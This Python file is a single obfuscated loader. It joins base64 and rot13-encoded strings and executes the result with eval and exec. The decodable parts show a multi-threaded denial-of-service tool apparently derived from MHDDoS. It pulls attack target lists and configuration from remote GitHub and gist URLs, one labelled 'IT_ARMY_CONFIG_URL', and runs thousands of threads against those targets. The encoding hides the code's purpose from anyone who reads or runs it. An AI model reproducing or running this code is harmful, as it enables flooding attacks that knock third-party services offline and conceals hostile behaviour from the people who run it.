import base64, codecs
magic = 'aW1wb3J0IGJhc2U2NCwgY29kZWNzDQptYWdpYyA9ICdabkp2YlNCaGMzbHVZMmx2SUM1c2IyY2dhVzF3YjNKMElHeHZaMmRsY2lCaGN5QmhjM2x1WTJsdlgyeHZaMmRsY2lBamJHbHVaVG94Q21aeWIyMGdZMjl1ZEdWNGRHeHBZaUJwYlhCdmNuUWdjM1Z3Y0hKbGMzTWdJMnhwYm1VNk1ncHBiWEJ2Y25RZ2JHOW5aMmx1WnlBamJHbHVaVG96Q21aeWIyMGdiWFZzZEdsd2NtOWpaWE56YVc1bklHbHRjRzl5ZENCamNIVmZZMjkxYm5RZ0kyeHBibVU2TkFwbWNtOXRJSEJoZEdoc2FXSWdhVzF3YjNKMElGQmhkR2dnSTJ4cGJtVTZOUXBtY205dElIUjVjR2x1WnlCcGJYQnZjblFnVDNCMGFXOXVZV3dnTEZSMWNHeGxJQ05zYVc1bE9qWUthVzF3YjNKMElIZGhjbTVwYm1keklDTnNhVzVsT2pjS1puSnZiU0JqYjJ4dmNtRnRZU0JwYlhCdmNuUWdSbTl5WlNBamJHbHVaVG81Q25kaGNtNXBibWR6SUM1bWFXeDBaWEozWVhKdWFXNW5jeUFvSW1sbmJtOXlaU0lwSTJ4cGJtVTZNVElLWTJ4aGMzTWdVbVZ0YjNabFZYTmxiR1Z6YzFkaGNtNXBibWR6SUNoc2IyZG5hVzVuSUM1R2FXeDBaWElnS1RvamJHbHVaVG94TlFvZ0lDQWdaR1ZtSUdacGJIUmxjaUFvVDA4d1R6QlBUekF3VHpCUFR6QXdNREFnTEU4d1QwOVBUekF3TURBd1R6QXdNREJQSUNrNkkyeHBibVU2TVRZS0lDQWdJQ0FnSUNCeVpYUjFjbTRnWVd4c0lDZ29Jbk52WTJ0bGRDNXpaVzVrS0NrZ2NtRnBjMlZrSUdWNFkyVndkR2x2Ymk0aWJtOTBJR2x1SUU4d1QwOVBUekF3TURBd1R6QXdNREJQSUM1blpYUk5aWE56WVdkbElDZ3BMQ0pUVTB3Z1kyOXVibVZqZEdsdmJpQnBjeUJqYkc5elpXUWlibTkwSUdsdUlFOHdUMDlQVHpBd01EQXdUekF3TURCUElDNW5aWFJOWlhOellXZGxJQ2dwS1NramJHbHVaVG95TUFwTVQwZEhSVkpmVFZOSFgwWlBVazFCVkNBOUoxc2xLR0Z6WTNScGJXVXBjeUF0SUNVb2JHVjJaV3h1WVcxbEtYTmRJQ1VvYldWemMyRm5aU2x6SnlOc2FXNWxPakl6Q2t4UFIwZEZVbDlFUVZSRlgwWlBVazFCVkNBOUlpVklPaVZOT2lWVElpTicNCmxvdmUgPSAnZm5KNXlCd1YwUHpraU0ycWNvenB0WXpXdXAyeXdEMjloTXp5YVZQdXpvM1dnTEtEdENIa0NFMHFTSHk5QUgwcXNFeDlGR0hTSFZ'
love = 'Dn3uZF0I5GKbkZSMEZIcUZUSIEHyKp0IFH0uSFGyHEmSKDHEWEUELExSzoxb1rHW3IwWDrzgcGGWkrKO2GwyiIQyuGGW5nR1fGzuAZxxjE1D5LH0lFJkJHUEuo0c1rR1HBJ1YZ09fomA1AIqfrUqiIUybGHqvoRSdL2MiZaSuGHgJqSyuDKykHzg5pKcWMyMDqTSTFQIHE2kjL1Lln2Airxt2Jaq0JRkYDGIirxSwomR5Mz8lpJSAF1M0JKcGrR1FGJAiIHI5pUMBLxu6FJqiZ015FHgOrJ9HFJ1jZKS1pUb1L296pJ1JHUEwJRMOMz5XAKyPq1ceHUcSrH12G21AF0HkpSZ5Z28mI2IAF1qmo1D5LH0lFJkJHUIQE21BnxqgGzcUoH9QJySCD1cEG0AnHR42EmACZT5XBJuZFzc0FwSSZKOHn3yJH2qwo2SRqSyHrJukHR9kF0M4M0A4AJyirxu0DaMOMz5XAKyPq1bjHUMBqSMDG2AAqx9QE21BnxqgGzcUoH9QJySCD1cEG0AnHR9wpTkCDz8lAKyJHJAfGHgSZKO6AUEJZzgwo3cVAycgFSuJHR50IyV4nxpjBTcnHwudE21BnycEG0AnHwudIyOeD1cFBTcUZQudJySCD1cEGzcUoH9QJyOBBHpjBTcnHwudJyV4nxqgGzcUoH5dE21BqSLln2Airxt2Jz1ZJSMDGaEJHwudE21CD1cFBTcnHwyQEmN5D1cEGzcJHGSzomWkLJ5XAJSJHQIHomAKM0kYEGOAF1M0JSEZqxbmM0AnHwyQJySCD1cFBTcnHH5dE21CD1cIZTylZQudE21CD0qgGzcnHwudJySCD1cFBTcmFGO0pwOeD0HjpIAVrGyOFQOkp0I4BHMUFSAVp0MJMx1HHmOAFx1apIOBBHqFBIISZRyTFmOSG0yFFKASrQyTE0uGFSMDrUqiIUybGHqvoHWBLaEJHR50pGW5ZT5DG21kF09dpUcWoKOfGzWSF3I3GHgCZT5XBJuJHUt2IwWeL296FQMnoKuLIyOBqSMDGaEJHR9zomWkLH1YIaEMLH91pUcWnUSDGzuhISAbGIEerKOuJaEXoH50F0L1oH1YEIEiZ1qaGRgSZR1YIaELHwudE21CD1cFBTcnHwyQEmN5D1cEGzcJHUu3o1E5nR1ULwOnGzATEmN5FRfjEIqVqx45FSEGZT5DGzWYZGy6oxbaQDcao2DtCFNarTkLZGuaF1Z1q1yLFzkvoySaGT5PnTAgIaIxD0SdLxqfqIcHomOAq3OEIJf5JIAIIyELZIMGIRMAM1OGM25uFSVjL0uAAxk5BKyMJTA1JwWfZTSVIzyxJR5fL21BqzWhHzkvoyS1JGV5qRjmDaMwoyWiLwW4oRkKEacMZyM1JxZknzSKAKIMImS2Lzx5nTZmGzkxFR12LyqTpTWcBUuZoyV0MRAwp0blnQOxFRW6G2x4qzAgEw'
god = 'NMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5d2IzSjBhRzlzWlMxaGMyTmxibVF0WTJsdWJtRnRiMjR2WVhOelpYUnpMMjFoYVc0dk1pNTBlSFFuTENkb2RIUndjem92TDNKaGR5NW5hWFJvZFdKMWMyVnlZMjl1ZEdWdWRDNWpiMjB2Y0c5eWRHaHZiR1V0WVhOalpXNWtMV05wYm01aGJXOXVMMkZ6YzJWMGN5OXRZV2x1THpNdWRIaDBKeXduYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMM0J2Y25Sb2IyeGxMV0Z6WTJWdVpDMWphVzV1WVcxdmJpOWhjM05sZEhNdmJXRnBiaTgwTG5SNGRDY3NLU05zYVc1bE9qVXdDa2xVWDBGU1RWbGZRMDlPUmtsSFgxVlNUQ0E5SjJoMGRIQnpPaTh2WjJsemRDNW5hWFJvZFdKMWMyVnlZMjl1ZEdWdWRDNWpiMjB2WkdSdmMzVnJjbUZwYm1VeU1ESXlMMlkzTXpreU5UQmtZbUV6TURoaE4yRXlNakUxTmpFM1lqRTNNVEUwWW1VNUwzSmhkeTl0YUdSdmMxOTBZWEpuWlhSelgzUmpjRjkyTWk1MGVIUW5JMnhwYm1VNk5URUtWa1ZTVTBsUFRsOVZVa3dnUFNkb2RIUndjem92TDNKaGR5NW5hWFJvZFdKMWMyVnlZMjl1ZEdWdWRDNWpiMjB2UW1sdmJtVmpXQzl0YUdSa2IzTmZjQzl0WVdsdUwzWmxjbk5wYjI0dWRIaDBKeU5zYVc1bE9qVXlDa05RVlY5RFQxVk9WQ0E5WTNCMVgyTnZkVzUwSUNncEkyeHBibVU2TlRRS1JFVkdRVlZNVkY5VVNGSkZRVVJUSUQwM05UQXdJR2xtSUVOUVZWOURUMVZPVkNBK01TQmxiSE5sSURFd01EQWdJMnhwYm1VNk5UVUtRMUJWWDFCRlVsOVFVazlEUlZOVElEMHlJQ05zYVc1bE9qVTNDa05QVGtaSlIxOUdSVlJEU0Y5U1InDQpkZXN0aW55ID0gJ0lFRkZISUdWUTAxVlBBZm5KNXlCd0g0UHhBQ0d4TVdFMTlURUlFUUZTOUhGSDFTRzFJSFZRMGtBRk53b1R5aE1HYjFCRGNGRUhNRkVJQVZLMDlKRUlXSEZIMVNWUTBsVlBBZm5KNXlCd0xqUHlXU0V5V1NIMHVzSHhTSEVGTjlBRk53b1R5aE1HYjJaRGNUREh5WklJV1NLMFdJRVJxU0lTOVRESEFIRzFWdENHWnRWMmtjb3pINkF3VlhFeFNXR1NJRkVJOVJFSGtPSkk5R0VIQUNHeEVHVlEwa1ZQQWZuSjV5QndMbVB4OUJHU3lzR0l5c0ZJTnRDR1JqWlBOd29UeWhNR2IyQU5jR0QwdVNFU0laRUlXc0ZINVdJU'
destiny = 'ayCE1Z5HHEWG09RZUyVFxMBBIcfGaqiIUybGHqvZxSRL0qRZUIGEIAWJxIWI3AUFUyPFmO5DxMWEKASrIqCEQSSI0pjAUEQE05bJxMBq29HrJuAE2VlDKEwE0DjqIASH0ynEHyKp0qVH0kYZUyPExySp0I5I09RZHIKEmN0qRAUGzuOEx53o1E5nR1ULwWOnzAUEQO1H0IGFIcSFIqmEKt5ExLkBHqRZSAnEHMBBIcfGaqiIUybGHqvZxWBL1SUZQIPFmSCExpjI1AYZH9GFUu5D0IDGwyOEx53o1E5nR1ULwWPETAWEIACp0E4H0uRZUImFSWGHHLjFHuVoR45JxqZqSLln2Airxt2DJ1BJRyVEHEYZRyPEmOKFHI5DKAVHyAWFQOVqRAUGzuOEx53o1E5nR1ULwAnETA3o1EGoKOfG3qiHR42IwWeL296FQMOoHELIyOBqSMFZH9SZRyPFIWFqRAVGJyjrxu0JKueI0HjqHuUFSAIEHt1FREWBIAXHR53o1E5nR1ULwAOETW0IyOBqRDkrH9Uqx45EKb5oR1TGzuUHayIEyASHHcVH0WYZRyZIyOOMz5XAKyPq3NlHUMBqSMDG1OUH0yGIyRkIT8mI3yJHQInExukIxyFI1cWFRymEHy0qSLln2Airxt2DJ1jJSMDGaEJHaSTEHuWDyMEZIEiZ1q5IyN1JxMVpIMWHaSTEHuWDxfjFHkJHRSzoxb1rHW3pQEDqx50IyOCGHIVn1cUZKO0D0uAnKO6FUEMrTgKEGO1FRcVFIcUHwyYFmOWGSMDDJMhFwI5DaqjAIO2GaEJHR9TEHuRqRAVGJyjrxu0JKueI0HjqHuVrRyFFmOWGSMDDJMhFwI5Daq0nyO2GaEJHR9TEHyOH0yDGwySrwyfGHMBnRu4FHqSFHE0IwWeL296FQMPHIWLWj0Xnz95VQ0tW1k4AmWprQMzKUt3ASk4ZmSprQZmWj0XqUW1p3DtCFOyqzSfXPqprQMxKUt2ZIk4AwqprQL5KUt2ZlpcVPftMKMuoPtaKUt2Z1k4AzMprQL0KUt2AIk4AwAprQpmKUtlMIk4AwEprQL1KUt2Z1k4AzMprQL0KUt2AIk4ZwuprQMwKUt2Myk4AmMprQL1KUtlL1k4ZwOprQMuKUt2Myk4AmyprQV5WlxtXlOyqzSfXPqprQL3KUt2Myk4AwDaXFNeVTI2LJjbW1k4AwAprQMzKUt2ASk4AwIprQLmKUt3Z1k4ZzIprQL0KUt2AIk4AwAprQMzKUt2ASk4AwIprQV4KUt2ASk4AwIprQpmKUt3ASk4AwyprQMyKUt3BIk4ZzAprQVjKUt2LIk4AzMprQp5KUtlBFpcQDcyqzSfXTAioKOcoTHbLzSmMGL0YzV2ATEyL29xMFuyqzSfXPqprQp0KUt3Zyk4AmIprQpmKUt3APpcXFjaCUA0pzyhMm4aYPqyrTIwWlxcQDb='
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))